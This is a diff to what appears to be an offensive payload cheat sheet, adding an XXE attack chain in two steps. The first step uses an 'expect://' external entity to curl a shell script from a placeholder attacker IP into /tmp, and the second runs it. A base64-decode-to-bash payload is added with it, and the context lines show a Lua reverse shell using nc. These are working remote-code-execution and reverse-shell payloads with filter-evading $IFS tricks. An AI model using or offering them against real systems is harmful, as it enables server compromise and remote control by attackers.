@@ -1126,7 +1126,30 @@ lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP
         CloseHandle(DupeToken);
     }
     </script>
-                                                                                                                    
+                                                                             
+#INDEX
+   
+#EXAMPLE
+
+#Payload (Save as shell.sh)
+
+echo {BASE64} | base64 -d | bash
+
+#Step 1: Download reverse Shell
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY test SYSTEM "expect://curl$IFS'{IP}/shell.sh'$IFS-o$IFS/tmp/shell.sh">]>
+<root>
+<email>&test;</email>
+</root>
+
+#Step 2: Run Reverse Shell
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY test SYSTEM "expect://bash$IFS/tmp/shell.sh">]>
+<root>
+<email>&test;</email>
+</root>                                                                                                                 
 
 
 
